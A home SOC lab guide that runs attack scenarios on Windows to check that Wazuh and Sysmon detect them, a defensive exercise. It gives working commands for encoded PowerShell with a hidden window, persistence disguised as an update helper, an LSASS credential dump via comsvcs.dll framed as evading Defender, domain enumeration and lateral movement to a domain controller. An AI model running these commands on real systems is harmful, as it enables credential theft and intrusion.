# Phase 8 – Attack Scenarios (RDP-Based)

## Attack Chain Overview

```
KALI (192.168.100.30)
    │
    │ xfreerdp (RDP / port 3389)
    ▼
WIN11 (192.168.100.20)  ← Foothold established
    │
    │ Lateral movement
    ▼
DC01 (192.168.100.10)  ← Target
```

All scenarios from this point forward are executed **inside the RDP session on WIN11** via PowerShell or CMD, unless stated otherwise. Open PowerShell as Administrator inside the RDP session before starting.

> **Reminder:** Take a VirtualBox snapshot of all VMs now labeled `Phase 8 - RDP foothold established` before proceeding.

---

## Completed Scenarios ✓

| # | Scenario | Tool | Status |
|---|---|---|---|
| 1 | Network scan | nmap | ✓ Done |
| 2 | Password spray | nxc smb | ✓ Done |
| 3 | Successful access | xfreerdp | ✓ Done — RDP into WIN11 |

---

## Scenario 4 — Encoded PowerShell Execution

Run this inside a **PowerShell (Admin)** window on WIN11 via the RDP session.

**Generate a base64-encoded command:**
```powershell
$command = 'whoami; hostname; ipconfig'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
Write-Host $encoded
```

**Execute the encoded command:**
```powershell
powershell.exe -NoProfile -EncodedCommand $encoded
```

**Try a few variations** to generate more diverse Sysmon events:
```powershell
# Encoded net user enumeration
$cmd2 = 'net user /domain'
$enc2 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd2))
powershell.exe -enc $enc2

# Encoded process listing
$cmd3 = 'Get-Process | Select-Object Name, Id'
$enc3 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd3))
powershell.exe -WindowStyle Hidden -EncodedCommand $enc3
```

**Verify in Wazuh:** Sysmon Event ID 1 (process creation) — filter for `CommandLine` containing `-enc` or `-EncodedCommand`. The `-WindowStyle Hidden` variant is particularly worth noting as a common real-world evasion flag.

**MITRE:** T1059.001 — PowerShell

---

## Scenario 5 — Scheduled Task Persistence

Still inside the WIN11 RDP session, PowerShell as Administrator:

**Create the persistence task:**
```powershell
schtasks /create /tn "WindowsUpdateHelper" /tr "C:\Windows\System32\calc.exe" /sc onlogon /ru SYSTEM /f
```

**Verify it was created:**
```powershell
schtasks /query /tn "WindowsUpdateHelper" /fo LIST
```

**Also add a registry run key** (second persistence technique, one step):
```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateHelper" -Value "C:\Windows\System32\calc.exe"
```

**Verify the registry key:**
```powershell
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
```

**Clean up both after verifying Wazuh caught them:**
```powershell
schtasks /delete /tn "WindowsUpdateHelper" /f
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateHelper"
```

**Verify in Wazuh:**
- Sysmon Event ID 1 for `schtasks.exe`
- Windows Security Event ID 4698 (scheduled task created)
- Sysmon Event ID 13 (RegistryEvent) for the Run key write

**MITRE:** T1053.005 (Scheduled Task), T1547.001 (Registry Run Key)

---

## Scenario 6 — Credential Dumping (No Mimikatz / Defender-Safe)

This method uses a **built-in Windows DLL** (`comsvcs.dll`) to dump LSASS memory — no third-party tool download needed, much less likely to be flagged by Defender than Mimikatz.

**Step 1 — Find the LSASS process ID:**
```powershell
Get-Process lsass
```
Note the `Id` value from the output (e.g. `784`).

**Step 2 — Dump LSASS memory using comsvcs.dll:**
```powershell
$pid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $pid C:\Windows\Temp\lsass.dmp full
```

**Step 3 — Confirm the dump file was created:**
```powershell
dir C:\Windows\Temp\lsass.dmp
```

> **Note:** This dump file would then be copied back to Kali for offline analysis with tools like Mimikatz or pypykatz. For this lab, creating the file and confirming Sysmon caught the LSASS access is the goal — you don't need to actually parse the dump.

**Optional — GUI method via Task Manager (since you have RDP):**
Inside the RDP session, open Task Manager → Details tab → right-click `lsass.exe` → Create dump file. Produces the same Sysmon signal with zero command-line footprint — worth doing as a comparison.

**Verify in Wazuh:**
- Sysmon Event ID 10 (ProcessAccess) where `TargetImage` contains `lsass.exe` — this is the primary detection signal
- Sysmon Event ID 11 (FileCreate) for the `.dmp` file creation

**MITRE:** T1003.001 — LSASS Memory

---

## Scenario 7 — Domain Enumeration (Pre-Lateral Movement Recon)

Before moving to DC01, enumerate the domain from WIN11 — this is realistic attacker behavior and generates its own set of detection signals:

```powershell
# Domain info
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# All domain users
net user /domain

# Domain admins specifically
net group "Domain Admins" /domain

# Domain computers
net view /domain:SOCLAB

# Logged-on users and sessions
qwinsta
query user
```

**Verify in Wazuh:** Sysmon Event ID 1 for `net.exe` calls, Windows Security Event ID 4661 (object handle requested) for directory service queries.

**MITRE:** T1087.002 (Domain Account Discovery), T1018 (Remote System Discovery)

---

## Scenario 8 — Lateral Movement (WIN11 → DC01)

Using credentials gathered earlier (or your known ITAdmin creds) to move from WIN11 to DC01 using **built-in Windows tools** — no extra tools needed.

**Method A — PowerShell Remoting (Enter-PSSession):**
```powershell
$cred = Get-Credential    # enter SOCLAB\ITAdmin and password when prompted
Enter-PSSession -ComputerName DC01 -Credential $cred
```
You'll get an interactive PowerShell session on DC01. Run a few commands to prove access:
```powershell
whoami
hostname
Get-ADUser -Filter * | Select Name    # lists all AD users from the DC
```
Exit when done:
```powershell
Exit-PSSession
```

**Method B — Remote command without interactive session:**
```powershell
$cred = Get-Credential
Invoke-Command -ComputerName DC01 -Credential $cred -ScriptBlock {
    whoami
    hostname
    ipconfig
}
```

**Method C — Map a network share (SMB lateral movement):**
```powershell
net use \\192.168.100.10\C$ /user:SOCLAB\ITAdmin YourPassword
dir \\192.168.100.10\C$
```

**Verify in Wazuh on DC01:**
- Windows Security Event ID 4624 (successful logon, Logon Type 3 for network)
- Windows Security Event ID 4648 (logon using explicit credentials)
- Sysmon Event ID 1 for any processes spawned remotely

**MITRE:** T1021.006 (PowerShell Remoting), T1021.002 (SMB/Windows Admin Shares)

---

## Scenario 9 — Atomic Red Team Simulations

Run from PowerShell (Admin) on WIN11 inside the RDP session:

```powershell
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
```

**Run individual technique tests:**
```powershell
# T1003.001 - LSASS credential dumping
Invoke-AtomicTest T1003.001

# T1053.005 - Scheduled task persistence
Invoke-AtomicTest T1053.005

# T1059.001 - PowerShell execution
Invoke-AtomicTest T1059.001

# T1087.002 - Domain account discovery
Invoke-AtomicTest T1087.002
```

**Check prerequisites before running** (some tests need specific tools/conditions):
```powershell
Invoke-AtomicTest T1003.001 -CheckPrereqs
```

**Clean up after each test:**
```powershell
Invoke-AtomicTest T1003.001 -Cleanup
Invoke-AtomicTest T1053.005 -Cleanup
```

**Verify in Wazuh:** same Event IDs as the corresponding manual scenarios above — running both confirms your detections aren't tied to one specific tool's behavior.

---

## Full MITRE ATT&CK Reference

| # | Scenario | Tool | Technique ID | Tactic |
|---|---|---|---|---|
| 1 | Network scan | nmap | T1046 | Discovery |
| 2 | Password spray | nxc smb | T1110.003 | Credential Access |
| 3 | RDP foothold | xfreerdp | T1021.001 | Lateral Movement |
| 4 | Encoded PowerShell | powershell -enc | T1059.001 | Execution |
| 5a | Scheduled task | schtasks | T1053.005 | Persistence |
| 5b | Registry run key | Set-ItemProperty | T1547.001 | Persistence |
| 6 | LSASS dump | comsvcs.dll | T1003.001 | Credential Access |
| 7 | Domain enumeration | net.exe / ADSI | T1087.002 | Discovery |
| 8a | Lateral movement | Enter-PSSession | T1021.006 | Lateral Movement |
| 8b | Lateral movement | net use | T1021.002 | Lateral Movement |
| 9 | Simulations | Atomic Red Team | Various | Various |

---

## Common Failure Points

| Symptom | Likely Cause / Fix |
|---|---|
| `Enter-PSSession` fails with access denied | WinRM not enabled on DC01 — run `Enable-PSRemoting -Force` on DC01 |
| comsvcs.dll dump creates empty file | Not running PowerShell as Administrator — reopen elevated |
| Sysmon Event ID 10 not appearing in Wazuh for LSASS dump | Confirm the Sysmon `<localfile>` block is still in ossec.conf on WIN11 and the WazuhSvc was restarted after adding it |
| Atomic Red Team import fails | Path may differ — run `dir C:\AtomicRedTeam` to confirm install location |
| `net use` to DC01 fails | Confirm DC01 has File and Printer Sharing enabled and the Windows Firewall rule for it is active |
